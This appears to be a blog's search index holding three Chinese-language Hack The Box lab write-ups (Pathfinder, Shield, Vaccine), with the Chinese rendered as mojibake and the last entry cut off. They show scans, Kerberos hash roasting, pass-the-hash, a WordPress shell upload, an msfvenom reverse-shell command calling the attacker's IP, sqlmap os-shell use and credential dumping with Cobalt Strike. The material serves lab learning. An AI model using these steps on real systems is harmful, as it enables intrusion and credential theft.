<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>box:Pathfinder</title>
      <link href="/box_Pathfinder.html"/>
      <url>/box_Pathfinder.html</url>
      
        <content type="html"><![CDATA[<p>ä»é›¶å¼€å§‹çš„hack_the_box ç”Ÿæ´»</p><p>èŒæ–°ç¬¬ä¸€æ¬¡æ¥è§¦çš„åŸŸæ¸—é€</p><a id="more"></a><h1 id="Pathfinder"><a href="#Pathfinder" class="headerlink" title="Pathfinder"></a>Pathfinder</h1><ul><li>  é¶æœºï¼š <code>10.10.10.30</code></li><li>  æ”»å‡»æœºï¼š<code>10.10.14.88</code></li></ul><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">â””â”€# nmap 10.10.10.30 -A                                                                                                                                                    4 âš™</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-02 01:11 EST</span><br><span class="line">Nmap scan report for 10.10.10.30</span><br><span class="line">Host is up (0.22s latency).</span><br><span class="line">Not shown: 989 closed ports</span><br><span class="line">PORT     STATE SERVICE           VERSION</span><br><span class="line">53/tcp   open  domain            Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2021-03-02 14:21:46Z)</span><br><span class="line">135/tcp  open  msrpc             Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  globalcatLDAPssl?</span><br></pre></td></tr></table></figure><p>nmapæ‰«æå‡ºäº†Kerberosã€LDAPç­‰ï¼Œå¤§è‡´å¯ä»¥æ–­å®šä¸ºæ˜¯ä¸€å°KDC</p><p><strong>ç”±äºèŒæ–°åˆæ¬¡æ¥è§¦åŸŸæ¸—é€ï¼Œæœ¬æœºå­åŸºæœ¬æ˜¯ç…§ç€wpå¤ç°ä¸€éï¼Œå­¦ä¹ ä¸€ä¸‹å·¥å…·çš„ä½¿ç”¨å’ŒåŸç†ä»€ä¹ˆçš„ã€‚</strong></p><h2 id="å…ˆå†™å†™è‡ªå·±åšäº†å•¥"><a href="#å…ˆå†™å†™è‡ªå·±åšäº†å•¥" class="headerlink" title="å…ˆå†™å†™è‡ªå·±åšäº†å•¥"></a>å…ˆå†™å†™è‡ªå·±åšäº†å•¥</h2><p>å¤§å¤šéƒ½æ˜¯æ— ç”¨åŠŸ</p><h3 id="å°è¯•ä½¿ç”¨impacket"><a href="#å°è¯•ä½¿ç”¨impacket" class="headerlink" title="å°è¯•ä½¿ç”¨impacket"></a>å°è¯•ä½¿ç”¨impacket</h3><p><a href="https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.22.dev-binaries">https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.22.dev-binaries</a></p><ul><li><p><code>psexec</code></p><p>  ä¹…ä»°å¤§åï¼Œä½†æ˜¯ä½¿ç”¨éœ€è¦ç›®æ ‡åŸŸæˆå‘˜èƒ½è®¿é—®<code>admin$</code>å…±äº«ï¼Œå³åŸŸæ§çš„<code>administrator</code>ç»„ï¼Œä¸€èˆ¬åŸŸæˆå‘˜ä½¿ç”¨ä¸äº†ã€‚ä¸Šä¸ªé¶æœºä¸­å¾—åˆ°çš„<strong>sandra</strong>ç”¨æˆ·åªæ˜¯ä¸€ä¸ªæ™®é€šçš„åŸŸæˆå‘˜ï¼Œæ— æƒä½¿ç”¨</p><p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302142632173.png" alt="image-20210302142632173"></p></li><li><p><code>wmiexec</code></p><p>  ä¹Ÿæ˜¯ä¹…ä»°å¤§åäº†ï¼Œæ€»è§‰å¾—ä»–ä¿©å·®ä¸å¤šï¼Œåœ¨è¿™ä¸ªç¯å¢ƒä¸­ä¹Ÿç”¨ä¸äº†ï¼Œæ²¡æœ‰æƒé™ï¼ˆğŸ¤·â€â™‚ï¸ï¼‰ï¼Œæ‚²</p><p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/F9658923E26596D4D4B082154CFDAE3D.jpg" alt="F9658923E26596D4D4B082154CFDAE3D"></p></li><li><p><code>smbexec</code></p><p>  è¿™å‡ ä¸ªçš„å‚æ•°éƒ½å·®ä¸å¤šä½ æ•¢ä¿¡ï¼Œä¸‡ä¸€äººå®¶å°±æ˜¯ä¸€æ ·çš„ä»£ç å‘¢ï¼ˆæ»‘ç¨½ï¼‰</p><p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/C3A4C2056AEDF963BA1F9A0A975764C1.jpg" alt="C3A4C2056AEDF963BA1F9A0A975764C1"></p></li><li><p><code>smbclient</code></p><p>  è¿™ä¸ªèƒ½ç™»å½•ï¼Œä½†æ˜¯åªèƒ½è¯»æ–‡ä»¶å•Šå–‚</p><p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302142751947.png" alt="image-20210302142751947"></p></li></ul><h3 id="å°è¯•é€šè¿‡ä¸Šä¸€å°æœºå­è¿æ¥DC"><a href="#å°è¯•é€šè¿‡ä¸Šä¸€å°æœºå­è¿æ¥DC" class="headerlink" title="å°è¯•é€šè¿‡ä¸Šä¸€å°æœºå­è¿æ¥DC"></a>å°è¯•é€šè¿‡ä¸Šä¸€å°æœºå­è¿æ¥DC</h3><p>åœ¨ä¸Šä¸€å°æœºå­çš„csä¸ŠåŠ å…¥ä¸€ä¸ªtarget</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302142903239.png" alt="image-20210302142903239"></p><p>ç„¶åå³é”®-&gt;jump</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302143007960.png" alt="image-20210302143007960"></p><p>ä½¿ç”¨sandraçš„å‡­è¯ç™»å½•ï¼Œéƒ½ä¸è¡Œ</p><p>è·å–åŸŸå†…ç”¨æˆ·hashï¼Œå¤±è´¥</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302144033652.png" alt="image-20210302144033652"></p><h2 id="åœ¨å†™ä¸€ä¸‹å¤ç°äº†å•¥"><a href="#åœ¨å†™ä¸€ä¸‹å¤ç°äº†å•¥" class="headerlink" title="åœ¨å†™ä¸€ä¸‹å¤ç°äº†å•¥"></a>åœ¨å†™ä¸€ä¸‹å¤ç°äº†å•¥</h2><ul><li><p>  ä½¿ç”¨<strong>BloodHound</strong>å·¥å…·ï¼ŒçŸ¥é“äº†å­˜åœ¨<code>svc_bes</code>ç”¨æˆ·ï¼Œå¹¶ä¸”è¯¥ç”¨æˆ·æ˜¯åŸŸç®¡ç†å‘˜</p></li><li><p>ä½¿ç”¨<code>GetNPUsers</code>ï¼Œå¾—åˆ°äº†<code>svc_bes</code>ç”¨æˆ·çš„TGTï¼Œå¹¶ä½¿ç”¨johnè§£å¯†</p><p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302144708936.png" alt="image-20210302144708936"></p><p>  <code>Sheffield19      ($krb5asrep$23$svc_bes@MEGACORP.LOCAL)</code></p></li><li><p>  ä½¿ç”¨<code>evil-winrm</code>ç™»å½•ï¼Œå¾—åˆ°å‘½ä»¤æ‰§è¡Œæƒé™ï¼Œcsä¸Šçº¿</p></li><li><p>ææƒ</p><ul><li>  ä½¿ç”¨<code>secretsdump_linux_x86_64</code>ï¼Œå¾—åˆ°<code>administrator</code>ç”¨æˆ·çš„hashå€¼</li><li>  <code>psexec</code>ä½¿ç”¨<code>pass the hash</code>æ”»å‡»</li></ul></li></ul><h2 id="æœ€åå†™å†™è‡ªå·±åˆå¹²äº†å•¥"><a href="#æœ€åå†™å†™è‡ªå·±åˆå¹²äº†å•¥" class="headerlink" title="æœ€åå†™å†™è‡ªå·±åˆå¹²äº†å•¥"></a>æœ€åå†™å†™è‡ªå·±åˆå¹²äº†å•¥</h2><p>åœ¨æ‹¿åˆ°<strong>svc_bes</strong>ç”¨æˆ·csä¸Šçº¿ä¹‹åï¼Œä½¿ç”¨<strong>æ¢¼æŒ</strong>çš„è·å–åŸŸå†…å…¨éƒ¨ç”¨æˆ·çš„hashæ¨¡å—ï¼Œå¾—åˆ°äº†administratorç”¨æˆ·çš„hashå€¼</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302150620403.png" alt="image-20210302150620403"></p><p>åœ¨ç”¨csè‡ªå¸¦çš„<code>psexec</code>ä½¿ç”¨<code>pass the hash</code>æ”»å‡»ï¼Œæ‹¿åˆ°çš„æƒé™å°±æ˜¯system</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302150933120.png" alt="image-20210302150933120"></p><p>ä¸ºä»€ä¹ˆç›´æ¥æ˜¯systemæƒé™å‘¢</p><blockquote><p>  psexec ä¼šå¯åŠ¨æœåŠ¡ï¼ŒæœåŠ¡ï¼ˆserviceï¼‰çš„æƒé™æ˜¯system </p><p>  ä½ çœ‹çœ‹psexecä¼šæ“ä½œçš„è¯¦ç»†æ­¥éª¤</p><p>  â€‹                                                                                                                â€”â€”lhaihaiå­¦é•¿</p></blockquote><p>æä¸Šæ—¥ç¨‹ï¼ˆæ–°å»ºé€‰é¡¹å¡ï¼‰</p><h2 id="åæ€"><a href="#åæ€" class="headerlink" title="åæ€"></a>åæ€</h2><p>å°èŒæ–°ç•¥å¾®å­¦ä¹ å­¦ä¹ äº†csçš„ä½¿ç”¨æ–¹æ³•ï¼Œå¯¹äº<code>blood-hound</code>è¿™ä¸ªå·¥å…·ï¼Œè¿˜æ˜¯ä¸€è„¸æ‡µé€¼</p><p>å°èŒæ–°åœ¨è„šæœ¬å°å­çš„è·¯ä¸Šè¶Šèµ°è¶Šè¿œ</p>]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> hack the box </category>
          
          <category> start point </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> windows </tag>
            
            <tag> hack the box </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>box:Shield</title>
      <link href="/box_Shield.html"/>
      <url>/box_Shield.html</url>
      
        <content type="html"><![CDATA[<p>ä»é›¶å¼€å§‹çš„hack_the_box ç”Ÿæ´»</p><a id="more"></a><h1 id="Shield"><a href="#Shield" class="headerlink" title="Shield"></a>Shield</h1><ul><li>  é¶æœºï¼š <code>10.10.10.29</code></li><li>  æ”»å‡»æœºï¼š<code>10.10.14.88</code></li></ul><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">â””â”€# nmap 10.10.10.29 -A                                                                                                                                                    </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-01 21:49 EST</span><br><span class="line">Nmap scan report for 10.10.10.29</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br></pre></td></tr></table></figure><p>3306 mysqlä¸å…è®¸è¿œç¨‹ç™»å½•ï¼Œæ— æ³•çˆ†ç ´ï¼Œå…¥å£ç‚¹åªæœ‰80ç«¯å£</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>ä¸Šæ¥å°±æ˜¯ä¸€ä¸ªiisï¼Œå¾ˆå¿«å•Š</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302105122136.png" alt="image-20210302105122136"></p><h3 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h3><p>æˆ‘ä¸€ä¸ª<code>dirsearch</code>ï¼Œéƒ½æ‰¾åˆ°äº†å•Š</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302105308625.png" alt="image-20210302105308625"></p><h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><p>ç¥­å‡º<code>wordpress</code>çš„æ¸—é€ç¥å™¨<code>wpscan</code>ï¼Œæ‰¾ç”¨æˆ·åï¼Œå¹¶çˆ†ç ´</p><p><code>wpscan --url http://10.10.10.29/wordpress/ --passwords /usr/share/wordlist/rockyou.txt</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302105646571.png" alt="image-20210302105646571"></p><p>è½¬å¿µä¸€æƒ³ï¼Œå‰å‡ ä¸ªéƒ½æœ‰è”åŠ¨ï¼Œè¿™ä¸ªä¼šæ²¡æœ‰ï¼Ÿæ‹¿å‡ºä¸Šé“é¢˜çš„å¯†ç <code>P@s5w0rd!</code></p><p>å¥½å®¶ä¼™ï¼Œè¿›äº†åå°</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302105837375.png" alt="image-20210302105837375"></p><h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><p>æœ‰å¤šç§æ–¹å¼getshellï¼Œæ¯”å¦‚è¯´</p><ul><li><p>æ’ä»¶</p><ul><li>  Wordpress æ”¯æŒè‡ªå®šä¹‰æ’ä»¶</li><li>  msfå­˜åœ¨æ¨¡å— <code>exploit/unix/webapp/wp_admin_shell_upload</code>ï¼Œå¯ä»¥ç›´æ¥åˆ©ç”¨æ’ä»¶ã€‚</li></ul></li><li><p>ä¿®æ”¹æºç </p><ul><li><p>åœ¨å¤–è§‚-&gt;ç¼–è¾‘å™¨å¤„å¯ä»¥ä¿®æ”¹phpæºç ï¼Œç›´æ¥ç•™webshellï¼Œåœ¨è¿™ä¸ªç«™æˆ‘æµ‹è¯•çš„æ—¶å€™ç•™äº†ä¸€å¥è¯æœ¨é©¬ï¼Œç»“æœå‡ºç°äº†é—®é¢˜ã€‚</p><p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302130127180.png" alt="image-20210302130127180"></p><p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302130815893.png" alt="image-20210302130815893"></p><p>  æ€»ä¹‹å°±æ˜¯ä¸å¤ªè¡Œã€‚</p></li></ul></li></ul><p>æ‰€ä»¥è¿˜æ˜¯msfå¥½ç”¨ï¼Œå¦‚ä¸‹è®¾ç½®å‚æ•°ï¼š</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302131005569.png" alt="image-20210302131005569"></p><p><font color='red'>ä¸Šé¢çš„lhoståº”è¯¥å†™å…¥è‡ªå·±çš„ipï¼Œä¸èƒ½ç”¨0.0.0.0ï¼Œä¼šå‡ºé”™ï¼Œæ‡’å¾—æ”¹äº†ï¼Œå°±è¿™æ ·äº†</font></p><p>å¾—åˆ°ä¸€ä¸ªshellï¼Œå¹¶ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302131326846.png" alt="image-20210302131326846"></p><p>ä½¿ç”¨èšå‰‘è¿æ¥</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302131514532.png" alt="image-20210302131514532"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>Windowsçš„ææƒå¯ä»¥ä½¿ç”¨msfä¸‹çš„ä¸€ä¸ªæ¨¡å—<code>post/multi/recon/local_exploit_suggester</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302131618990.png" alt="image-20210302131618990"></p><p>ä½†æ˜¯è¿™ä¸ªå¿…é¡»è¦ä¸€ä¸ªWindowsçš„<code>meterpreter session</code>ï¼Œç”¨</p><p><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.88 LPORT=8848 -f exe &gt; msf_x64.exe</code></p><p>ç”Ÿæˆä¸€ä¸ªpayloadï¼Œä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Šï¼Œmsfæ‰“å¼€<code>handler</code>ï¼Œæ‰§è¡Œæœ¨é©¬ï¼Œå¾—åˆ°ä¸€ä¸ªä¼šè¯</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302132104042.png" alt="image-20210302132104042"></p><p>ä½¿ç”¨<code>suggester</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302133113265.png" alt="image-20210302133113265"></p><p>è¯´å¯ä»¥ç”¨<code>ms16_075</code>ææƒ</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302133253493.png" alt="image-20210302133253493"></p><p>ç»“æœå´å¤±è´¥äº†ï¼Œä½†æ˜¯ç¡®å®è¯´äº†æ˜¯<strong>vulnerable</strong>ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯å‚æ•°ä¸å¯¹</p><p>è¿™é‡Œæœ‰ä¸ªå‚æ•°æ˜¯<code>clsid</code></p><blockquote><p>  <a href="https://blog.csdn.net/wmnmtm/article/details/82922028">https://blog.csdn.net/wmnmtm/article/details/82922028</a></p></blockquote><p><font color='red'>ç›®å‰è¿˜ä¸çŸ¥é“åœ¨<code>ms16_075</code>ä¸­è¿™ä¸ªidæ˜¯å¹²å•¥çš„ï¼Œæ‰¾ä¸åˆ°ç›¸å…³èµ„æ–™ã€‚ç›²çŒœæ˜¯å†™å…¥äº†ç‰¹å®šçš„idï¼Œæ”¹å˜äº†æƒé™</font></p><p>ç½‘ä¸Šæ‰¾äº†ä¸€ä¸‹å…¶ä»–çš„<code>clsid</code></p><blockquote><p>   <a href="https://www.cnblogs.com/hookjoy/p/12460089.html">https://www.cnblogs.com/hookjoy/p/12460089.html</a></p></blockquote><p>ç›®æ ‡ç³»ç»Ÿæ˜¯<strong>windows 2016</strong></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302133833707.png" alt="image-20210302133833707"></p><p>é€‰äº† **{42C21DF5-FB58-4102-90E9-96A213DC7CE8}**ï¼Œå†æ¬¡<code>exploit</code>ï¼ŒæˆåŠŸ</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302134011551.png" alt="image-20210302134011551"></p><p>flagï¼š<img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302134131022.png" alt="image-20210302134131022"></p><h2 id="åè¯"><a href="#åè¯" class="headerlink" title="åè¯"></a>åè¯</h2><p>åæ¥ç¿»äº†ç¿»wpï¼Œå‘ç°æœ€åæœ‰ä¸€æ­¥å¯¼å‡ºå¯†ç çš„æ“ä½œï¼Œåœ¨ä¸‹ä¸€ä¸ªæœºå­æœ‰ç”¨ï¼Œé‚£å°±é¡ºä¾¿å­¦ä¹ ä¸€ä¸‹cs</p><p>ä¸Šä¼ cs_x64çš„é©¬ï¼Œsystemä¸Šçº¿</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302134509016.png" alt="image-20210302134509016"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">beacon&gt;</span><span class="bash"> sleep 1</span></span><br><span class="line">[*] Tasked beacon to sleep for 1s</span><br><span class="line"><span class="meta">beacon&gt;</span><span class="bash"> shell whoami</span></span><br><span class="line">[*] Tasked beacon to run: whoami</span><br><span class="line">[+] host called home, sent: 53 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure><p>ç”¨ <a href="https://github.com/pandasec888/taowu-cobalt-strike">æ¢¼æŒ</a>æ’ä»¶çš„å‡­è¯è·å–</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302134832578.png" alt="image-20210302134832578"></p><p>å¯¼å‡ºç”¨æˆ·<strong>sandra</strong>çš„å¯†ç  <strong>Password1234!**ï¼ŒåŸŸåï¼š</strong>MEGACORP.LOCAL**</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302134943182.png" alt="image-20210302134943182"></p><p>ç›´æ¥ä½¿ç”¨<code>net time /domain</code>å»è¯·æ±‚åŸŸä¼šå¤±è´¥ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯æ²¡æœ‰æ¥å…¥åŸŸå§ã€‚</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302135113724.png" alt="image-20210302135113724"></p><h2 id="åæ€"><a href="#åæ€" class="headerlink" title="åæ€"></a>åæ€</h2><p>Windowsææƒçš„æ‰‹æ®µåˆå¤šäº†ä¸€ç‚¹ï¼ŒçŸ¥è¯†é¢æ…¢æ…¢æ‰“å¼€ã€‚</p><p>è„šæœ¬å°å­åˆå…»æˆã€‚</p>]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> hack the box </category>
          
          <category> start point </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> windows </tag>
            
            <tag> hack the box </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>box:Vaccine</title>
      <link href="/box_Vaccine.html"/>
      <url>/box_Vaccine.html</url>
      
        <content type="html"><![CDATA[<p>ä»é›¶å¼€å§‹çš„hack_the_box ç”Ÿæ´»</p><a id="more"></a><h1 id="Vaccine"><a href="#Vaccine" class="headerlink" title="Vaccine"></a>Vaccine</h1><ul><li>  é¶æœºï¼š <code>10.10.10.46</code></li><li>  æ”»å‡»æœºï¼š<code>10.10.14.88</code></li></ul><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">â””â”€# nmap 10.10.10.46 -A                                                                                                                                                    1 âš™</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-01 20:46 EST</span><br><span class="line">Nmap scan report for 10.10.10.46</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line">Not shown: 977 closed ports</span><br><span class="line">PORT      STATE    SERVICE       VERSION</span><br><span class="line">21/tcp    open     ftp           vsftpd 3.0.3</span><br><span class="line">22/tcp    open     ssh           OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)</span><br><span class="line">|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)</span><br><span class="line">|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)</span><br><span class="line">80/tcp    open     http          Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: MegaCorp Login</span><br></pre></td></tr></table></figure><p>è€æ ·å­ï¼Œé‡åˆ°ftpå’Œsshå…ˆçˆ†ç ´ä¸€æ³¢ï¼ŒwebæœåŠ¡è®¿é—®ä¹Ÿæ˜¯ç™»å½•ï¼Œä¹Ÿçˆ†ç ´</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302095757633.png" alt="image-20210302095757633"></p><p>ä¸€é¡¿æ“ä½œçŒ›å¦‚è™ï¼Œä¸€çœ‹ï¼Œå•¥éƒ½æ²¡æœ‰ã€‚</p><p>ç»“æœftpçš„å¯†ç å±…ç„¶æ˜¯ä¸Šä¸€é“é¢˜<code>/root/.config/filezilla</code>ä¸‹çš„<code>filezilla.xml</code></p><p><code>ftpuser/mc@F1l3ZilL4</code>åäº†</p><h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>ç™»å½•ä¸Šå»å‘ç°backup.zip</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302095011014.png" alt="image-20210302095011014"></p><p>ä¸‹è½½ä¸‹æ¥ï¼Œè§£å‹éœ€è¦å¯†ç </p><p>ä½¿ç”¨<code>fcrackzip</code>çˆ†ç ´å¯†ç ï¼Œ<a href="https://blog.csdn.net/weixin_43272781/article/details/100751375">å‚æ•°å’Œä½¿ç”¨æ•™ç¨‹</a></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302095159837.png" alt="image-20210302095159837"></p><p>è§£å‹åå¾—åˆ°<code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) === <span class="string">&quot;2cb42f8734ea607eefed3b70af13bbd3&quot;</span>) &#123;</span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">      header(<span class="string">&quot;Location: dashboard.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç ´è§£ä¸€ä¸‹hash</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302095706364.png" alt="image-20210302095706364"></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>å¾—åˆ°äº†ç”¨æˆ·åå’Œå¯†ç ä¹‹åå°±å¯ä»¥ç™»å½•äº†ï¼Œç™»å½•ä¹‹åæœ‰ä¸€ä¸ªæœç´¢æ¡†ï¼Œè¿™å›æ€»æ˜¯sqlæ³¨å…¥äº†å§</p><p>æœä¸å…¶ç„¶ï¼Œç›´æ¥å †å æ³¨å…¥ã€‚</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302095959505.png" alt="image-20210302095959505"></p><p>çœ‹ä¸€ä¸‹ç‰ˆæœ¬</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">version</span>();</span><br><span class="line">PostgreSQL 11.5 (Ubuntu 11.5-1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.1.0-9ubuntu2) 9.1.0, 64-bit</span><br></pre></td></tr></table></figure><p>è¿™æ•°æ®åº“æ²¡æœ‰æ³¨è¿‡å•Šã€‚</p><ul><li><p>sqlmapã€‚ â€“os-shell</p><p>  å±…ç„¶èƒ½ç”¨</p><p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302102217607.png" alt="image-20210302102217607"></p><p>  ä¼ è¿‡å»ä¸€ä¸ªncï¼Œè¿ä¸Šåå¼¹shell</p><p>  ![image-20210302102920598](/Users/shirohaethu/Library/Application Support/typora-user-images/image-20210302102920598.png)</p><p>  <img 